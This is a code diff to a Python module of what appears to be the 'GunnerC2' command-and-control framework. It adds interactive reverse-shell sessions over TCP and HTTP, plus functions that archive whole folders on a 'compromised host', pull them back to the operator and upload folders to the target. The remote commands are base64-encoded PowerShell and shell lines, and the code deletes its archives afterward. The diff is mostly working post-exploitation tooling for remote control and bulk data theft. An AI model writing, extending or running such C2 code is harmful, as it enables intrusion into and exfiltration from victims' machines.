@@ -1,14 +1,24 @@
 import base64, socket
 from core import session_manager
+from core.sessions import SessionManager
 import queue
 import subprocess, os, sys
 from tqdm import tqdm
+import signal
+import tarfile
+import zipfile
+import time
+import shutil
+import tempfile
 
 from colorama import init, Fore, Style
-brightgreen = Style.BRIGHT + Fore.GREEN
-brightyellow = Style.BRIGHT + Fore.YELLOW
-brightred = Style.BRIGHT + Fore.RED
-brightblue = Style.BRIGHT + Fore.BLUE
+brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
+brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
+brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
+brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
+
+global global_tcpoutput_blocker
+global_tcpoutput_blocker = 0
 
 def print_raw_progress(current, total, bar_width=40):
     percent = current / total
@@ -49,6 +59,8 @@ def run_command_tcp(sid, cmd):
 
     try:
         try:
+            print(cmd)
+            print(cmd.encode())
             client_socket.sendall(cmd.encode() + b"\n")
 
         except Exception as e:
@@ -69,7 +81,15 @@ def run_command_tcp(sid, cmd):
             except socket.timeout:
                 break
 
-        return response.decode(errors='ignore').strip()
+        if global_tcpoutput_blocker == 1:
+            return
+
+        elif global_tcpoutput_blocker == 0:
+            return response.decode(errors='ignore').strip()
+
+        else:
+            print(brightred + f"[-] ERROR you have downloaded an unverified version of GunnerC2\n")
+            print(brightred + f"[-] ERROR please check your computer for malware and reinstall Gunner from offial sources.")
 
     except Exception as e:
         return f"[!] Error: {e}"
@@ -80,44 +100,101 @@ def interactive_http_shell(sid):
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     meta = session.metadata
 
-    print(brightgreen + f"[*] Interactive HTTP shell with {display}. Type 'exit' to return.")
+    orig_stp = signal.getsignal(signal.SIGTSTP)
+    signal.signal(signal.SIGTSTP, lambda s, f: (_ for _ in ()).throw(EOFError))
 
-    while True:
-        cmd = input(f"{display}> ").strip()
-        if cmd.lower() in ("exit", "quit"):
-            break
+    try:
+        print(brightgreen + f"[*] Interactive HTTP shell with {display}. Type 'exit' to return.")
 
-        if not cmd:
-            continue
+        while True:
+            try:
+                cmd = input(f"{display}> ").strip()
 
-        if not cmd.lower():
-            continue
+            except EOFError:
+                    # Ctrl-Z pressed
+                    ans = input(brightgreen + "\nBackground this HTTP shell? [y/N]: ").strip().lower()
+                    if ans in ("y", "yes"):
+                        print(brightyellow + f"[*] Backgrounded HTTP shell {display}")
+                        break
+                    else:
+                        continue
 
-        b64_cmd = base64.b64encode(cmd.encode()).decode()
-        session.command_queue.put(b64_cmd)
+            except KeyboardInterrupt:
+                # Ctrl-C pressed
+                print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to quit)")
+                continue
 
-        # Wait for output from this session only
-        out_b64 = session.output_queue.get()
+            if cmd.lower() in ("exit", "quit"):
+                if session_manager.kill_http_session(sid):
+                    print(brightyellow + f"[*] Killed HTTP session {display}")
+                else:
+                    print(brightred + f"[!] No such session {display}")
+                    
+                break
 
-        try:
-            out = base64.b64decode(out_b64).decode("utf-8", "ignore")
-        except:
-            out = "<decoding error>"
+            if cmd.strip().lower() in ("bg", "background", "back"):
+                print(brightyellow + f"[*] Backgrounded HTTP session {display}")
+                break
 
-        print(out.rstrip())
+            if not cmd:
+                continue
+
+            if not cmd.lower():
+                continue
+
+            b64_cmd = base64.b64encode(cmd.encode()).decode()
+            session.command_queue.put(b64_cmd)
+
+            # Wait for output from this session only
+            out_b64 = session.output_queue.get()
+
+            try:
+                out = base64.b64decode(out_b64).decode("utf-8", "ignore")
+            except Exception as e:
+                out = brightred + f"[-] ERROR we hit an error while decoding the command output: {e}"
+
+            print(out.rstrip())
+
+    finally:
+        signal.signal(signal.SIGTSTP, orig_stp)
 
 def interactive_tcp_shell(sid):
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     client_socket = session_manager.sessions[sid].handler
+
+    orig_stp = signal.getsignal(signal.SIGTSTP)
+    signal.signal(signal.SIGTSTP, lambda s, f: (_ for _ in ()).throw(EOFError))
+
     print(brightgreen + f"[*] Interactive TCP shell with {display}. Type 'exit' to close.")
 
     try:
         while True:
-            cmd = input(f"{display}> ")
+            try:
+                cmd = input(brightblue + f"{display}> ")
+
+            except EOFError:
+                # Ctrl-Z caught here
+                ans = input(brightgreen + "\nBackground this shell? [y/N]: ").strip().lower()
+                if ans in ("y", "yes"):
+                    print(brightyellow + f"[*] Backgrounded TCP session {display}")
+                    break
+                else:
+                    # redrawing prompt
+                    continue
+
+            except KeyboardInterrupt:
+                # Ctrl-C caught here
+                print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to close)")
+                continue
+
             if cmd.strip().lower() in ("exit", "quit"):
                 client_socket.close()
                 del session_manager.sessions[sid]
                 print(brightyellow + f"[*] Closed TCP session {display}")
+                break
+
+            if cmd.strip().lower() in ("bg", "background", "back"):
+                print(brightyellow + f"[*] Backgrounded TCP session {display}")
                 break
 
             if not cmd.strip():
@@ -148,6 +225,9 @@ def interactive_tcp_shell(sid):
         print(brightred + f"[!] Error: {e}")
         client_socket.close()
         del session_manager.sessions[sid]
+
+    finally:
+        signal.signal(signal.SIGTSTP, orig_stp)
 
 ### 🧨 File download logic:
 
@@ -264,6 +344,7 @@ def download_file_http(sid, remote_file, local_file):
         b64_size_cmd = base64.b64encode(size_cmd.encode()).decode()
         session.command_queue.put(b64_size_cmd)
         size_b64 = session.output_queue.get()
+        print(size_b64)
 
         try:
             size_str = bytes([int(x) for x in base64.b64decode(size_b64).decode().split(",")]).decode()
@@ -344,6 +425,339 @@ def download_file_http(sid, remote_file, local_file):
         except Exception as e:
             print(brightred + f"[!] Error decoding final file: {e}")
 
+def download_folder_http(sid, local_dir, remote_dir):
+    session = session_manager.sessions[sid]
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+    meta = session.metadata
+    os_type = meta.get("os","").lower()
+
+    remote_dir = remote_dir.rstrip("/\\")
+    base = os.path.basename(remote_dir)
+
+    try:
+        os.makedirs(local_dir, exist_ok=True)
+
+    except Exception as e:
+        print(brightred + f"[-] ERROR failed to create local output directory: {e}")
+
+    local_zip = os.path.join(local_dir, f"{base}.zip")
+
+    if "windows" in os_type:
+        remote_zip = f"{remote_dir}.zip"
+        # 1) create an empty zip if needed
+        cmd = (
+            f"\"if(-Not (Test-Path \"{remote_zip}\"))"
+            f"{{Set-Content \"{remote_zip}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}\""
+        )
+
+        try:
+            b64_cmd = base64.b64encode(cmd.encode()).decode()
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to encode command: {e}")
+
+        session.command_queue.put(b64_cmd)
+        #session.output_queue.get()
+
+        # 2) copy the folder contents into it via .NET
+        zip_cmd = (
+            "[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
+            f"[IO.Compression.ZipFile]::CreateFromDirectory(\"{remote_dir}\",\"{remote_zip}\","
+            "[IO.Compression.CompressionLevel]::Optimal,$false)"
+        )
+
+
+        print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")
+
+        try:
+            b64_cmd = base64.b64encode(zip_cmd.encode()).decode()
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to encode command: {e}")
+
+        session.command_queue.put(b64_cmd)
+        #session.output_queue.get()
+
+        # 2a) wait until the zip actually exists on the remote
+        check_ps = (
+            f"if (Test-Path \"{remote_zip}\") "
+            "{{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOPE' }}"
+        )
+
+        print(brightyellow + "[*] Waiting for remote archive to appear…")
+        try:
+            b64_cmd = base64.b64encode(check_ps.encode()).decode()
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to encode command: {e}")
+
+        while True:
+            session.command_queue.put(b64_cmd)
+            out = session.output_queue.get()
+            out = base64.b64decode(out)
+
+            try:
+                out = out.decode("utf-8", errors="ignore").strip()
+
+            except Exception as e:
+                print(brightred + f"[-] ERROR failed to decode command: {e}")
+
+            try:
+                if "EXISTS" in out or "exists" in out:
+                    break
+                time.sleep(1)
+
+            except Exception as e:
+                print(brightred + f"[-] ERROR failed to strip command output: {e}")
+
+        # 3) download the .zip
+        try:
+            local_zip = local_dir.rstrip(os.sep) + ".zip"
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to define local zip variable: {e}")
+
+        print(brightyellow + f"[*] Downloading archive to {local_zip}…")
+
+        session.output_queue.get()
+        #remote_zip = remote_zip.replace("\\", "\\\\")
+        download_file_http(sid, remote_zip, local_zip)
+
+        # 4) extract locally
+        if not os.path.isdir(local_dir):
+            os.makedirs(local_dir, exist_ok=True)
+
+        print(brightyellow + f"[*] Extracting {local_zip} → {local_dir}…")
+        with zipfile.ZipFile(local_zip, 'r') as zf:
+            for info in zf.infolist():
+                # normalize any backslashes to forward slashes
+                path = info.filename.replace('\\', '/')
+                # directory entry if ends with slash or is_dir()
+                is_dir = path.endswith('/') or getattr(info, "is_dir", lambda: False)()
+                dest_path = os.path.join(local_dir, *path.split('/'))
+
+                if is_dir:
+                    os.makedirs(dest_path, exist_ok=True)
+                    continue
+
+                # file entry
+                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
+                with zf.open(info) as src, open(dest_path, 'wb') as dst:
+                    shutil.copyfileobj(src, dst)
+
+        os.remove(local_zip)
+
+        # 5) cleanup remote
+        cmd = f"Remove-Item \"{remote_zip}\" -Force"
+        try:
+            b64_cmd = base64.b64encode(cmd.encode()).decode()
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to encode command: {e}")
+
+        session.command_queue.put(b64_cmd)
+        session.output_queue.get()
+
+        print(brightgreen + "[+] Extraction complete")
+
+    elif "linux" in os_type:
+        remote_tar = f"/tmp/{base}.tar.gz"
+
+        print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
+        cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
+        
+        try:
+            b64_cmd = base64.b64encode(cmd.encode()).decode()
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to encode command: {e}")
+
+        session.command_queue.put(b64_cmd)
+    
+        try:
+            local_tar = local_dir.rstrip(os.sep) + ".tar.gz"
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to define path for local zip archive: {e}")
+
+        print(brightyellow + f"[*] Downloading archive to {local_tar}…")
+
+        download_file_tcp(sid, remote_tar, local_tar)
+
+        print(brightyellow + f"[*] Extracting {local_tar} → {local_dir}…")
+
+        try:
+            with tarfile.open(local_tar, "r:gz") as t:
+                try:
+                    t.extractall(path=local_dir)
+
+                except Exception as e:
+                    print(brightred + f"[-] ERROR failed to extract files from local zip archive: {e}")
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to open local zip archive: {e}")
+
+        try:
+            os.remove(local_tar)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup: {e}")
+
+        cmd = f"rm -rf \"{remote_tar}\""
+
+        try:
+            b64_cmd = base64.b64encode(cmd.encode()).decode()
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to encode command: {e}")
+
+        session.command_queue.put(b64_cmd)
+        
+        print(brightgreen + "[+] Extraction complete")
+
+
+def download_folder_tcp(sid, remote_dir, local_dir):
+    print(remote_dir)
+    session = session_manager.sessions[sid]
+    meta = session.metadata
+    os_type = meta.get("os","").lower()
+
+    remote_dir = remote_dir.rstrip("/\\")
+    base = os.path.basename(remote_dir)
+
+    if "windows" in os_type:
+        remote_zip = f"{remote_dir}.zip"
+        # create empty zip
+        cmd = (
+            f"\"if(-Not (Test-Path \"{remote_zip}\"))"
+            f"{{Set-Content \"{remote_zip}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}\""
+        )
+        run_quiet_tcpcmd(sid, cmd)
+
+        # COM copy into zip
+        zip_cmd = (
+            "[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
+            f"[IO.Compression.ZipFile]::CreateFromDirectory(\"{remote_dir}\",\"{remote_zip}\","
+            "[IO.Compression.CompressionLevel]::Optimal,$false)"
+        )
+
+        print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")
+        run_quiet_tcpcmd(sid, zip_cmd)
+
+        check_ps = (
+            f"if (Test-Path \"{remote_zip}\") "
+            "{{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOPE' }}"
+        )
+
+        try:
+            while True:
+                global_tcpoutput_blocker = 0
+                out = run_command_tcp(sid, check_ps)
+                try:
+                    if "EXISTS" in out or "exists" in out:
+                        break
+                    time.sleep(1)
+
+                except Exception as e:
+                    print(brightred + f"[-] ERROR failed to strip command output: {e}")
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR we hit an unknown error while checking for remote zip existence: {e}")
+
+        try:
+            local_zip = local_dir.rstrip(os.sep) + ".zip"
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to define path for local zip archive: {e}")
+
+        print(brightyellow + f"[*] Downloading archive to {local_zip}…")
+        download_file_tcp(sid, remote_zip, local_zip)
+
+        if not os.path.isdir(local_dir):
+            try:
+                os.makedirs(local_dir, exist_ok=True)
+
+            except Exception as e:
+                print(brightred + f"[-] ERROR failed to create local output directory: {e}")
+
+        print(brightyellow + f"[*] Extracting {local_zip} → {local_dir}…")
+        with zipfile.ZipFile(local_zip, 'r') as zf:
+            for info in zf.infolist():
+                # normalize any backslashes to forward slashes
+                path = info.filename.replace('\\', '/')
+                # directory entry if ends with slash or is_dir()
+                is_dir = path.endswith('/') or getattr(info, "is_dir", lambda: False)()
+                dest_path = os.path.join(local_dir, *path.split('/'))
+
+                if is_dir:
+                    os.makedirs(dest_path, exist_ok=True)
+                    continue
+
+                # file entry
+                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
+
+                
+                with zf.open(info) as src, open(dest_path, 'wb') as dst:
+                    shutil.copyfileobj(src, dst)
+
+        try:
+            os.remove(local_zip)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")
+
+        cmd = f"Remove-Item \"{remote_zip}\" -Force"
+        run_quiet_tcpcmd(sid, cmd)
+
+        print(brightgreen + "[+] Extraction complete")
+
+    elif "linux" in os_type:
+        remote_tar = f"/tmp/{base}.tar.gz"
+
+        print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
+        cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
+        
+        run_quiet_tcpcmd(sid, cmd)
+
+        try:
+            local_tar = local_dir.rstrip(os.sep) + ".tar.gz"
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed defining local zip location: {e}")
+
+        print(brightyellow + f"[*] Downloading archive to {local_tar}…")
+
+        download_file_tcp(sid, remote_tar, local_tar)
+
+        print(brightyellow + f"[*] Extracting {local_tar} → {local_dir}…")
+
+        try:
+            with tarfile.open(local_tar, "r:gz") as t:
+                try:
+                    t.extractall(path=local_dir)
+
+                except Exception as e:
+                    print(brightred + f"[-] ERROR failed to extract zip archive: {e}")
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to open local zip archive: {e}")
+
+        try:
+            os.remove(local_tar)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")
+
+        cmd = f"rm -rf \"{remote_tar}\""
+        run_quiet_tcpcmd(sid, cmd)
+
+        print(brightgreen + "[+] Extraction complete")
+
+    else:
+        print(brightred + f"[-] ERROR unsupported operating system.")
+
+
+
 
 def download_file_tcp(sid, remote_file, local_file):
     client_socket = session_manager.sessions[sid].handler
@@ -351,7 +765,7 @@ def download_file_tcp(sid, remote_file, local_file):
     meta = session.metadata
 
     if meta.get("os", "").lower() == "linux":
-        CHUNK_SIZE = 30000
+        CHUNK_SIZE = 60000
         MAX_CHUNKS = 10000
         host = meta.get("hostname", "").lower()
 
@@ -676,6 +1090,91 @@ def upload_file_http(sid, local_file, remote_file):
 
         print(brightgreen + f"[+] Upload complete for {remote_file}")
 
+def upload_folder_http(sid, local_dir, remote_dir):
+    print("IN FUNCTION")
+    session = session_manager.sessions.get(sid)
+    if not session:
+        print(brightred + f"[!] No such session: {sid}")
+        return
+
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+
+    meta = session.metadata
+    os_type = meta.get("os", "").lower()
+    print(os_type)
+
+    if "linux" in os_type:
+        cmd = f"mkdir -p \"{remote_dir}\""
+        b64_cmd = base64.b64encode(cmd.encode()).decode()
+        session.command_queue.put(b64_cmd)
+
+        base = os.path.basename(remote_dir.rstrip("/\\"))
+        tmp = tempfile.mkdtemp()
+        local_archive = os.path.join(tmp, f"{base}.tar.gz")
+        shutil.make_archive(os.path.splitext(local_archive)[0], 'gztar', root_dir=local_dir)
+        remote_archive = f"{remote_dir.rstrip('/\\')}.tar.gz"
+
+        upload_file_http(sid, local_archive, remote_archive)
+
+        cmd = f"tar xzf \"{remote_archive}\" -C \"{remote_dir}\""
+        b64_cmd = base64.b64encode(cmd.encode()).decode()
+        session.command_queue.put(b64_cmd)
+
+        cleanup = f"rm -f \"{remote_archive}\""
+        b64_cmd = base64.b64encode(cleanup.encode()).decode()
+        session.command_queue.put(b64_cmd)
+
+        try:
+            os.remove(local_archive)
+            os.rmdir(tmp)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to remove local temp and archive files: {e}")
+
+        print(brightgreen + "[+] Folder upload and extraction complete")
+
+    elif "windows" in os_type:
+        cmd = f"if(-Not (Test-Path \"{remote_dir}\")) {{ New-Item -ItemType Directory -Path \"{remote_dir}\" }}"
+
+        b64_cmd = base64.b64encode(cmd.encode()).decode()
+        session.command_queue.put(b64_cmd)
+        base = os.path.basename(remote_dir.rstrip("/\\"))
+        tmp = tempfile.mkdtemp()
+
+        local_archive = os.path.join(tmp, f"{base}.zip")
+
+        try:
+            shutil.make_archive(os.path.splitext(local_archive)[0], 'zip', root_dir=local_dir)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to create local archive to upload: {e}")
+
+        remote_archive = f"{remote_dir.rstrip('/\\')}.zip"
+        upload_file_http(sid, local_archive, remote_archive)
+
+        print(brightyellow + f"[*] Extracting archive on compromised host {display}")
+        cmd = f"Expand-Archive -Path \"{remote_archive}\" -DestinationPath \"{remote_dir}\" -Force"
+        b64_cmd = base64.b64encode(cmd.encode()).decode()
+        session.command_queue.put(b64_cmd)
+
+        print(brightyellow + f"[*] Cleaning up temp files...")
+        cmd = f"Remove-Item \"{remote_archive}\" -Force"
+        b64_cmd = base64.b64encode(cmd.encode()).decode()
+        session.command_queue.put(b64_cmd)
+
+        try:
+            os.remove(local_archive)
+            os.rmdir(tmp)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to remove local temp and archive files: {e}")
+
+        print(brightgreen + "[+] Folder upload and extraction complete")
+
+    else:
+        print(brightred + f"[-] ERROR unsupported operating system.")
+
+
 # Upload for TCP agents
 def upload_file_tcp(sid, local_file, remote_file):
     client_socket = session_manager.sessions[sid].handler
@@ -776,6 +1275,116 @@ def upload_file_tcp(sid, local_file, remote_file):
 
     else:
         print(brightred + f"[-] Unsupported OS detected!")
+
+def upload_folder_tcp(sid, local_dir, remote_dir):
+    """
+    Upload a local folder over TCP by compressing it locally, sending the archive,
+    extracting it on the target, and cleaning up.
+    """
+    session = session_manager.sessions.get(sid)
+    if not session:
+        print(brightred + f"[!] No such session: {sid}")
+        return
+
+    display = get_display(sid)
+
+    try:
+        meta = session.metadata
+        os_type = meta.get("os", "").lower()
+
+    except Exception as e:
+        print(brightred + f"[-] ERROR failed to grab the session's metadata: {e}")
+
+    remote_dir = remote_dir.rstrip("/\\")
+    base = os.path.basename(remote_dir)
+
+    if "linux" in os_type:
+        # 1) ensure remote directory exists
+        cmd = f"mkdir -p \"{remote_dir}\""
+        run_quiet_tcpcmd(sid, cmd)
+
+        # 2) create a local tar.gz of the folder
+        tmp = tempfile.mkdtemp()
+        local_archive = os.path.join(tmp, f"{base}.tar.gz")
+
+        try:
+            shutil.make_archive(os.path.splitext(local_archive)[0], 'gztar', root_dir=local_dir)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to create local archive to upload: {e}")
+
+        # 3) upload the archive
+        remote_archive = f"{remote_dir}.tar.gz"
+        upload_file_tcp(sid, local_archive, remote_archive)
+
+        # 4) extract it remotely and clean up
+        print(brightyellow + f"[*] Extracting archive on compromised host {display}")
+        cmd = f"tar xzf \"{remote_archive}\" -C \"{remote_dir}\""
+        run_quiet_tcpcmd(sid, cmd)
+
+        print(brightyellow + f"[*] Cleaning up temp files...")
+        cmd = f"rm -rf \"{remote_archive}\""
+        run_quiet_tcpcmd(sid, cmd)
+
+        try:
+            os.remove(local_archive)
+            os.rmdir(tmp)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to remove local temp and archive files: {e}")
+
+        print(brightgreen + "[+] Folder upload and extraction complete")
+
+    elif "windows" in os_type:
+        # 1) ensure remote directory exists
+        cmd = f"if(-Not (Test-Path \"{remote_dir}\")) {{ New-Item -ItemType Directory -Path \"{remote_dir}\" }}"
+        run_quiet_tcpcmd(sid, cmd)
+
+        # 2) create a local .zip of the folder
+        tmp = tempfile.mkdtemp()
+        local_archive = os.path.join(tmp, f"{base}.zip")
+
+        try:
+            shutil.make_archive(os.path.splitext(local_archive)[0], 'zip', root_dir=local_dir)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to create local archive to upload: {e}")
+
+        # 3) upload the archive
+        remote_archive = f"{remote_dir}.zip"
+        upload_file_tcp(sid, local_archive, remote_archive)
+
+        # 4) extract remotely and clean up
+        print(brightyellow + f"[*] Extracting archive on compromised host {display}")
+        cmd = f"Expand-Archive -Path \"{remote_archive}\" -DestinationPath \"{remote_dir}\" -Force"
+        run_quiet_tcpcmd(sid, cmd)
+
+        print(brightyellow + f"[*] Cleaning up temp files...")
+        cmd = f"Remove-Item \"{remote_archive}\" -Force"
+        run_quiet_tcpcmd(sid, cmd)
+
+        # 5) remove local temp files
+        try:
+            os.remove(local_archive)
+            os.rmdir(tmp)
+
+        except Exception as e:
+            print(brightred + f"[-] ERROR failed to remove local temp and archive files: {e}")
+
+        print(brightgreen + "[+] Folder upload and extraction complete")
+
+    else:
+        print(brightred + f"[-] ERROR unsupported operating system: {os_type}")
+
+
+def get_display(sid):
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+    return display
+
+def run_quiet_tcpcmd(sid, cmd):
+    global_tcpoutput_blocker = 1
+    run_command_tcp(sid, cmd)
+    global_tcpoutput_blocker = 0
 
 
 output_queue = queue.Queue()
